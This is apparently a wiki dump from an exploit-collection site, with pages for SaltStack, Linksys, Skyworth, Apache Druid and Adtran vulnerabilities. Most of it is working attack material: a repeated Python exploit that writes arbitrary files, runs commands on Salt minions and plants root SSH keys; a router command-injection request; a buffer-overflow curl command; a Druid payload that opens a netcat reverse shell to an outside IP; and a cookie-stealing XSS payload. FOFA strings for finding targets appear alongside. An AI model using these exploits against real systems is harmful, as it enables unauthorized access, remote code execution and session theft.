      <text bytes="5475" sha1="4x72ky9x2nftigozosbebr9pfrw206s" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
All versions before Saltstack 3002.2
SaltStack =&lt; 3002.2
SaltStack =&lt; 3001.4
SaltStack =&lt; 3000.6

&lt;translate&gt;
salt-api wheel_async未授權訪問 (CVE-2021-25281)

sdb rest插件模版渲染問題 (CVE-2021-25283)

wheel/pillar_roots.py文件任意寫漏洞 (CVE-2021-25282)
&lt;/translate&gt;

==POC==
CVE-2021-25281 + CVE-2021-25282
&lt;pre&gt;
http://target/run
POST:
"client": "wheel_async",
"fun": "pillar_roots.write",
"data": "../../../../../tmp/test2",
"path": "../../../../../tmp/test2",
"username": "password",
"password": "username",
"eauth": "pam"
&lt;/pre&gt;

===cve-2021-25281.py===
&lt;pre&gt;
# Copyright (C) 2021 Alex Seymour, Immersive Labs
# https://github.com/Immersive-Labs-Sec/CVE-2021-25281
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from argparse import ArgumentParser, Namespace
from pathlib import Path
from secrets import token_hex
from textwrap import dedent

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path: Path):
    try:
        with file_path.open() as handle:
            return handle.read()
    except OSError:
        print(f'[-] Cannot read file {file_path}')
        exit(1)


def send_request(url: str, path: str, data: str):
    path = path[1:] if path.startswith('/') else path
    url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run'
    try:
        response = requests.post(
            url,
            verify=False,
            json={
                'eauth': 'auto',
                'client': 'wheel_async',
                'fun': 'pillar_roots.write',
                'data': data,
                'path': f'../../../../../../{path}',
            },
        )
    except requests.RequestException:
        print(f'[-] Failed to send request to {url}')
        exit(1)

    if json := response.json():
        print(f'[+] Got JID: {json["return"][0]["jid"]}, the job was queued successfully')
    else:
        print('[-] No JID was returned, the request may have failed or the target is not vulnerable')


def handle_write_file(args: Namespace):
    if args.file:
        file_contents = read_file(args.file)
    elif args.data:
        file_contents = args.data
    else:
        print('[-] Either file or data is required')
        exit(1)

    print('[+] Attempting to write file')
    send_request(args.target, args.path, file_contents)


def handle_state_file(args: Namespace):
    state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls'
    file_contents = dedent(f"""\
    '{args.cmd}':
      cmd.run
    """)

    print(f'[+] Attempting to write command to {state_file_path} state file')
    send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents)


def handle_ssh_key(args: Namespace):
    public_key = read_file(args.public_key)

    print(f'[+] Attempting to write an authorized key for user {args.user}')
    if args.user == 'root':
        send_request(args.target, '/root/.ssh/authorized_keys', public_key)
    else:
        send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key)


def main():
    parser = ArgumentParser()
    parser.add_argument('target', help='The URL of the target Salt master')
    subparsers = parser.add_subparsers()

    write_parser = subparsers.add_parser('write', help='Write data to a file on the master')
    write_parser.add_argument('path', help='The file path to write to on the target')
    write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target')
    write_parser.add_argument('-d', '--data', help='The raw contents to write to a file')
    write_parser.set_defaults(func=handle_write_file)

    state_parser = subparsers.add_parser('state', help='Create a state file to try and run commands on minions')
    state_parser.add_argument('cmd', help='A command to add to a new state file')
    state_parser.set_defaults(func=handle_state_file)

    ssh_parser = subparsers.add_parser('ssh', help='Write an SSH key to try and gain remote access to the master')
    ssh_parser.add_argument('public_key', type=Path, help='A file containing the public key to upload')
    ssh_parser.add_argument('-u', '--user', default='root', help='The user on the target to try and upload the key to')
    ssh_parser.set_defaults(func=handle_ssh_key)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>4x72ky9x2nftigozosbebr9pfrw206s</sha1>
    </revision>
    <revision>
      <id>7153</id>
      <parentid>7152</parentid>
      <timestamp>2021-07-13T11:03:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>7153</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5521" sha1="bqzs5fzcciy2kdwkgfmuu7e961wty3y" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
All versions before Saltstack 3002.2
SaltStack =&lt; 3002.2
SaltStack =&lt; 3001.4
SaltStack =&lt; 3000.6

&lt;translate&gt;
salt-api wheel_async未授權訪問 (CVE-2021-25281)

sdb rest插件模版渲染問題 (CVE-2021-25283)

wheel/pillar_roots.py文件任意寫漏洞 (CVE-2021-25282)
&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
app="SALTSTACK-产品"
&lt;/pre&gt;

==POC==
CVE-2021-25281 + CVE-2021-25282
&lt;pre&gt;
http://target/run
POST:
"client": "wheel_async",
"fun": "pillar_roots.write",
"data": "../../../../../tmp/test2",
"path": "../../../../../tmp/test2",
"username": "password",
"password": "username",
"eauth": "pam"
&lt;/pre&gt;

===cve-2021-25281.py===
&lt;pre&gt;
# Copyright (C) 2021 Alex Seymour, Immersive Labs
# https://github.com/Immersive-Labs-Sec/CVE-2021-25281
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from argparse import ArgumentParser, Namespace
from pathlib import Path
from secrets import token_hex
from textwrap import dedent

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path: Path):
    try:
        with file_path.open() as handle:
            return handle.read()
    except OSError:
        print(f'[-] Cannot read file {file_path}')
        exit(1)


def send_request(url: str, path: str, data: str):
    path = path[1:] if path.startswith('/') else path
    url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run'
    try:
        response = requests.post(
            url,
            verify=False,
            json={
                'eauth': 'auto',
                'client': 'wheel_async',
                'fun': 'pillar_roots.write',
                'data': data,
                'path': f'../../../../../../{path}',
            },
        )
    except requests.RequestException:
        print(f'[-] Failed to send request to {url}')
        exit(1)

    if json := response.json():
        print(f'[+] Got JID: {json["return"][0]["jid"]}, the job was queued successfully')
    else:
        print('[-] No JID was returned, the request may have failed or the target is not vulnerable')


def handle_write_file(args: Namespace):
    if args.file:
        file_contents = read_file(args.file)
    elif args.data:
        file_contents = args.data
    else:
        print('[-] Either file or data is required')
        exit(1)

    print('[+] Attempting to write file')
    send_request(args.target, args.path, file_contents)


def handle_state_file(args: Namespace):
    state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls'
    file_contents = dedent(f"""\
    '{args.cmd}':
      cmd.run
    """)

    print(f'[+] Attempting to write command to {state_file_path} state file')
    send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents)


def handle_ssh_key(args: Namespace):
    public_key = read_file(args.public_key)

    print(f'[+] Attempting to write an authorized key for user {args.user}')
    if args.user == 'root':
        send_request(args.target, '/root/.ssh/authorized_keys', public_key)
    else:
        send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key)


def main():
    parser = ArgumentParser()
    parser.add_argument('target', help='The URL of the target Salt master')
    subparsers = parser.add_subparsers()

    write_parser = subparsers.add_parser('write', help='Write data to a file on the master')
    write_parser.add_argument('path', help='The file path to write to on the target')
    write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target')
    write_parser.add_argument('-d', '--data', help='The raw contents to write to a file')
    write_parser.set_defaults(func=handle_write_file)

    state_parser = subparsers.add_parser('state', help='Create a state file to try and run commands on minions')
    state_parser.add_argument('cmd', help='A command to add to a new state file')
    state_parser.set_defaults(func=handle_state_file)

    ssh_parser = subparsers.add_parser('ssh', help='Write an SSH key to try and gain remote access to the master')
    ssh_parser.add_argument('public_key', type=Path, help='A file containing the public key to upload')
    ssh_parser.add_argument('-u', '--user', default='root', help='The user on the target to try and upload the key to')
    ssh_parser.set_defaults(func=handle_ssh_key)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>bqzs5fzcciy2kdwkgfmuu7e961wty3y</sha1>
    </revision>
    <revision>
      <id>7154</id>
      <parentid>7153</parentid>
      <timestamp>2021-07-13T11:04:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>7154</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5533" sha1="ac8l22t9nf1ryg6nrzqm2n7len7dzmn" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
All versions before Saltstack 3002.2
SaltStack =&lt; 3002.2
SaltStack =&lt; 3001.4
SaltStack =&lt; 3000.6
&lt;/pre&gt;
&lt;translate&gt;
salt-api wheel_async未授權訪問 (CVE-2021-25281)

sdb rest插件模版渲染問題 (CVE-2021-25283)

wheel/pillar_roots.py文件任意寫漏洞 (CVE-2021-25282)
&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
app="SALTSTACK-产品"
&lt;/pre&gt;

==POC==
CVE-2021-25281 + CVE-2021-25282
&lt;pre&gt;
http://target/run
POST:
"client": "wheel_async",
"fun": "pillar_roots.write",
"data": "../../../../../tmp/test2",
"path": "../../../../../tmp/test2",
"username": "password",
"password": "username",
"eauth": "pam"
&lt;/pre&gt;

===cve-2021-25281.py===
&lt;pre&gt;
# Copyright (C) 2021 Alex Seymour, Immersive Labs
# https://github.com/Immersive-Labs-Sec/CVE-2021-25281
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from argparse import ArgumentParser, Namespace
from pathlib import Path
from secrets import token_hex
from textwrap import dedent

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path: Path):
    try:
        with file_path.open() as handle:
            return handle.read()
    except OSError:
        print(f'[-] Cannot read file {file_path}')
        exit(1)


def send_request(url: str, path: str, data: str):
    path = path[1:] if path.startswith('/') else path
    url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run'
    try:
        response = requests.post(
            url,
            verify=False,
            json={
                'eauth': 'auto',
                'client': 'wheel_async',
                'fun': 'pillar_roots.write',
                'data': data,
                'path': f'../../../../../../{path}',
            },
        )
    except requests.RequestException:
        print(f'[-] Failed to send request to {url}')
        exit(1)

    if json := response.json():
        print(f'[+] Got JID: {json["return"][0]["jid"]}, the job was queued successfully')
    else:
        print('[-] No JID was returned, the request may have failed or the target is not vulnerable')


def handle_write_file(args: Namespace):
    if args.file:
        file_contents = read_file(args.file)
    elif args.data:
        file_contents = args.data
    else:
        print('[-] Either file or data is required')
        exit(1)

    print('[+] Attempting to write file')
    send_request(args.target, args.path, file_contents)


def handle_state_file(args: Namespace):
    state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls'
    file_contents = dedent(f"""\
    '{args.cmd}':
      cmd.run
    """)

    print(f'[+] Attempting to write command to {state_file_path} state file')
    send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents)


def handle_ssh_key(args: Namespace):
    public_key = read_file(args.public_key)

    print(f'[+] Attempting to write an authorized key for user {args.user}')
    if args.user == 'root':
        send_request(args.target, '/root/.ssh/authorized_keys', public_key)
    else:
        send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key)


def main():
    parser = ArgumentParser()
    parser.add_argument('target', help='The URL of the target Salt master')
    subparsers = parser.add_subparsers()

    write_parser = subparsers.add_parser('write', help='Write data to a file on the master')
    write_parser.add_argument('path', help='The file path to write to on the target')
    write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target')
    write_parser.add_argument('-d', '--data', help='The raw contents to write to a file')
    write_parser.set_defaults(func=handle_write_file)

    state_parser = subparsers.add_parser('state', help='Create a state file to try and run commands on minions')
    state_parser.add_argument('cmd', help='A command to add to a new state file')
    state_parser.set_defaults(func=handle_state_file)

    ssh_parser = subparsers.add_parser('ssh', help='Write an SSH key to try and gain remote access to the master')
    ssh_parser.add_argument('public_key', type=Path, help='A file containing the public key to upload')
    ssh_parser.add_argument('-u', '--user', default='root', help='The user on the target to try and upload the key to')
    ssh_parser.set_defaults(func=handle_ssh_key)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>ac8l22t9nf1ryg6nrzqm2n7len7dzmn</sha1>
    </revision>
    <revision>
      <id>7155</id>
      <parentid>7154</parentid>
      <timestamp>2021-07-13T11:04:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>7155</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5577" sha1="cxrd3c33fut536p7h15j4hgsoba28mc" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
All versions before Saltstack 3002.2
SaltStack =&lt; 3002.2
SaltStack =&lt; 3001.4
SaltStack =&lt; 3000.6
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
salt-api wheel_async未授權訪問 (CVE-2021-25281)

&lt;!--T:3--&gt;
sdb rest插件模版渲染問題 (CVE-2021-25283)

&lt;!--T:4--&gt;
wheel/pillar_roots.py文件任意寫漏洞 (CVE-2021-25282)
&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
app="SALTSTACK-产品"
&lt;/pre&gt;

==POC==
CVE-2021-25281 + CVE-2021-25282
&lt;pre&gt;
http://target/run
POST:
"client": "wheel_async",
"fun": "pillar_roots.write",
"data": "../../../../../tmp/test2",
"path": "../../../../../tmp/test2",
"username": "password",
"password": "username",
"eauth": "pam"
&lt;/pre&gt;

===cve-2021-25281.py===
&lt;pre&gt;
# Copyright (C) 2021 Alex Seymour, Immersive Labs
# https://github.com/Immersive-Labs-Sec/CVE-2021-25281
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from argparse import ArgumentParser, Namespace
from pathlib import Path
from secrets import token_hex
from textwrap import dedent

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path: Path):
    try:
        with file_path.open() as handle:
            return handle.read()
    except OSError:
        print(f'[-] Cannot read file {file_path}')
        exit(1)


def send_request(url: str, path: str, data: str):
    path = path[1:] if path.startswith('/') else path
    url = f'https://{url}/run' if not url.startswith(('http', 'https')) else f'{url}/run'
    try:
        response = requests.post(
            url,
            verify=False,
            json={
                'eauth': 'auto',
                'client': 'wheel_async',
                'fun': 'pillar_roots.write',
                'data': data,
                'path': f'../../../../../../{path}',
            },
        )
    except requests.RequestException:
        print(f'[-] Failed to send request to {url}')
        exit(1)

    if json := response.json():
        print(f'[+] Got JID: {json["return"][0]["jid"]}, the job was queued successfully')
    else:
        print('[-] No JID was returned, the request may have failed or the target is not vulnerable')


def handle_write_file(args: Namespace):
    if args.file:
        file_contents = read_file(args.file)
    elif args.data:
        file_contents = args.data
    else:
        print('[-] Either file or data is required')
        exit(1)

    print('[+] Attempting to write file')
    send_request(args.target, args.path, file_contents)


def handle_state_file(args: Namespace):
    state_file_path = Path('/srv') / 'salt' / f'{token_hex(16)}.sls'
    file_contents = dedent(f"""\
    '{args.cmd}':
      cmd.run
    """)

    print(f'[+] Attempting to write command to {state_file_path} state file')
    send_request(args.target, f'/srv/salt/{state_file_path.name}', file_contents)


def handle_ssh_key(args: Namespace):
    public_key = read_file(args.public_key)

    print(f'[+] Attempting to write an authorized key for user {args.user}')
    if args.user == 'root':
        send_request(args.target, '/root/.ssh/authorized_keys', public_key)
    else:
        send_request(args.target, f'/home/{args.user}/.ssh/authorized_keys', public_key)


def main():
    parser = ArgumentParser()
    parser.add_argument('target', help='The URL of the target Salt master')
    subparsers = parser.add_subparsers()

    write_parser = subparsers.add_parser('write', help='Write data to a file on the master')
    write_parser.add_argument('path', help='The file path to write to on the target')
    write_parser.add_argument('-f', '--file', type=Path, help='A file to upload to the target')
    write_parser.add_argument('-d', '--data', help='The raw contents to write to a file')
    write_parser.set_defaults(func=handle_write_file)

    state_parser = subparsers.add_parser('state', help='Create a state file to try and run commands on minions')
    state_parser.add_argument('cmd', help='A command to add to a new state file')
    state_parser.set_defaults(func=handle_state_file)

    ssh_parser = subparsers.add_parser('ssh', help='Write an SSH key to try and gain remote access to the master')
    ssh_parser.add_argument('public_key', type=Path, help='A file containing the public key to upload')
    ssh_parser.add_argument('-u', '--user', default='root', help='The user on the target to try and upload the key to')
    ssh_parser.set_defaults(func=handle_ssh_key)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>cxrd3c33fut536p7h15j4hgsoba28mc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25310 Linksys WRT160NL 身份驗證命令注入漏洞</title>
    <ns>0</ns>
    <id>1290</id>
    <revision>
      <id>1618</id>
      <timestamp>2021-04-13T09:09:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; app="LINKSYS-WRT160NL" &lt;/pre&gt;  ==POC== &lt;pre&gt; POST /apply.cgi;session_id=8e780f3bcc71e19a37cc3e60a5576241 HTTP/1.1 Host: 192.168.1.150 User-Agent: Mozilla/5.0 (X..."</comment>
      <origin>1618</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="690" sha1="4vzdts501rwf0sbzg2g0qn6zulcikug" xml:space="preserve">==FOFA==
&lt;pre&gt;
app="LINKSYS-WRT160NL"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
POST /apply.cgi;session_id=8e780f3bcc71e19a37cc3e60a5576241 HTTP/1.1
Host: 192.168.1.150
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 854
Origin: http://192.168.1.150
Connection: close
Referer: http://192.168.1.150/index.asp;session_id=8e780f3bcc71e19a37cc3e60a5576241
Upgrade-Insecure-Requests: 1

pptp_dhcp=0&amp;(...)&amp;ui_language=es||ls&gt;/tmp/b||&amp;(...)
&lt;/pre&gt;</text>
      <sha1>4vzdts501rwf0sbzg2g0qn6zulcikug</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25328 Shenzhen Skyworth (深圳創維)RN510緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1809</id>
    <revision>
      <id>2226</id>
      <timestamp>2021-05-05T04:42:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; curl -i -s -k -X $'POST' \     -H $'Host: device_IP' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/htm..."</comment>
      <origin>2226</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1147" sha1="dh9hfws70lnyxwo0kcxyw73z9110ikt" xml:space="preserve">==EXP==
&lt;pre&gt;
curl -i -s -k -X $'POST' \
    -H $'Host: device_IP' -H $'User-Agent: Mozilla/5.0 (X11; Linux
x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
$'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate'
-H $'Referer: http://device-ip/cgi-bin/app-staticIP.asp' -H
$'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length:
500' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'SESSIONID=valid_cookie; UID=username; PSW=password' \
    --data-binary
$'hEntry0=-1&amp;hEntry1=-1&amp;hEntry2=-1&amp;hEntry3=-1&amp;hEntry4=-1&amp;hEntry5=-1&amp;hEntry6=-1&amp;hEntry7=-1&amp;hEntry8=-1&amp;delete_flag=0&amp;add_flag=1&amp;staticNum=0&amp;emptyEntry=0&amp;tmpStartIp=192.168.2.33&amp;tmpPoolCount=32&amp;dhcpEthStart=192.168.2.33&amp;dhcpEthEnd=32&amp;ethSubnetMask=255.255.255.0&amp;IpAddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;MACAddr=AA%3ABB%3ACC%3ADD%3AEE%3AFF'
\
    $'http://device_ip/cgi-bin/app-staticIP.asp'
&lt;/pre&gt;</text>
      <sha1>dh9hfws70lnyxwo0kcxyw73z9110ikt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25646 Apache Druid JavaScript RCE漏洞</title>
    <ns>0</ns>
    <id>259</id>
    <revision>
      <id>405</id>
      <timestamp>2021-03-18T09:38:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt; ==POC== &lt;pre&gt; POST /druid/indexer/v1/sampler HTTP/1.1 ... ...  {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.get..."</comment>
      <origin>405</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="233" sha1="idfe14q0cvle13t3ijuedgb3zmgvbx8" xml:space="preserve">&lt;languages   /&gt;
==POC==
&lt;pre&gt;
POST /druid/indexer/v1/sampler HTTP/1.1
...
...
 {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('nc 192.168.1.10 5555 -e /bin/sh')}"
&lt;/pre&gt;</text>
      <sha1>idfe14q0cvle13t3ijuedgb3zmgvbx8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25679 Adtran Personal Phone Manager 10.8.1 - 'emailAddress' 存儲型XSS漏洞</title>
    <ns>0</ns>
    <id>1475</id>
    <revision>
      <id>1852</id>
      <timestamp>2021-04-22T01:58:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Adtran Personal Phone Manager 10.8.1 - 'emailAddress' Stored Cross-Site Scripting (XSS)  # Date: 1/21/2021 # Exploit Author: 3ndG4me # Vendor Ho..."</comment>
      <origin>1852</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4894" sha1="tfbcll5qwcufh0fkt22gmuov0vlk1fe" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Adtran Personal Phone Manager 10.8.1 - 'emailAddress' Stored Cross-Site Scripting (XSS) 
# Date: 1/21/2021
# Exploit Author: 3ndG4me
# Vendor Homepage: https://adtran.com/web/page/portal/Adtran/wp_home
# Version: v10.8.1
# Tested on: NetVanta 7060 and NetVanta 7100
# CVE : CVE-2021-25679

# CVE-2021-25679 - Adtran Personal Phone Manager Authenticated Stored XSS in Change Email Address Form

--Summary--

The AdTran Personal Phone Manager software is vulnerable to an authenticated stored cross-site scripting (XSS) issues. These issues impact at minimum versions 10.8.1 and below but potentially impact later versions as well since they have not previously been disclosed. Only version 10.8.1 was able to be confirmed during primary research

ADTRAN, Inc
https://adtran.com

--Affects--

- AdTran Personal Phone Manager
- Verified on v10.8.1
- **Note**: The affected appliances NetVanta 7060 and NetVanta 7100 are considered End of Life and as such this issue will not be patched. It is recommended impacted users update to an actively supported appliance.

--Details--

The AdTran Personal Phone Manager software is vulnerable to an authenticated stored cross-site scripting (XSS) issues. These issues impact at minimum versions 10.8.1 and below but potentially impact later versions as well since they have not previously been disclosed. Only version 10.8.1 was able to be confirmed during primary research. These issues work by passing in a basic XSS payload to vulnerable POST parameters that are rendered in the output without saniztization. Since the forms do require authentication to access these issues cannot be exploited without credentials. This can allow for several issues including but not limited to:

- Hijacking another user's session
- Modifying a user's configuration settings
- Using XSS payloads to capture input (keylogging)

-- Proof of Concept --
The following form was impacted and can be exploited with the sample payloads provided below:
- https://example.com/userapp/userSettingsAction.html
	- POST
		- 	formAction=changeEmailAddress&amp;emailAddress=+data%22%3E%3Cscript%3Ealert%`document.cookie`60%3C%2Fscript%3E+&amp;emailAddress2=&amp;emailApply=Apply+Changes

The vulnerable parameters that were identified are:
- emailAddress
- emailAddress2

--Mitigation--

Sanitize any user controlled input in both form fields and URL paramaters to properly encode data so it is not rendered as arbitrary HTML/JavaScript.

--Timeline--

- 1/21/2021: XSS Vulnerability was discovered and documented. A temporary CVE identifier was requested by MITRE. AdTran was also notified with the full details of each finding via their product security contact at https://adtran.com/web/page/portal/Adtran/wp_product_security. A baseline 90 day disclosure timeline was established in the initial communication.
- 1/22/2021: Placeholder CVE-2021-25679 was assigned by MITRE.
- 1/29/2021: A response from AdTran's Product Security Team was received.
- 2/8/2021: The researcher responded to the email acknowledging receipt. The encrypted email contents appeared to be corrupted so a request was made to resend the data.
- 2/9/2021: AdTran's Product Security Team replied with a re-encrypted copy of the previous communication made on 1/29/2021. The reasearcher was able to successfully decrypt the contents of this communication. The communication informed the researcher that the disclosed issues targeting NetVanta 7060 and NetVanta 7100 would not be addressed. The justification for this decision is that software support ended in June of 2018, and product EOL occurred in December of 2020. As such AdTran would not be invesitgating the issues leaving the details of the findings as is. The reseacher responded with acknowledgement to the decision and requested support to proceed with full disclosure outside of the previously established 90 day timeline.
- 2/11/2021: AdTran's product security team responded to the request for full disclosure. They informed the researcher that they would like to discuss the decision internally first. The researcher acknowledged the request and affirmed they would not procceed with disclosure until further notice.
- 3/1/2021: AdTran's product security team reached out to inform the researcher that they would support the full disclosure of the vulnerability at the researcher's discretion. They provided a few details on model names to include as EOL for the disclosure details.
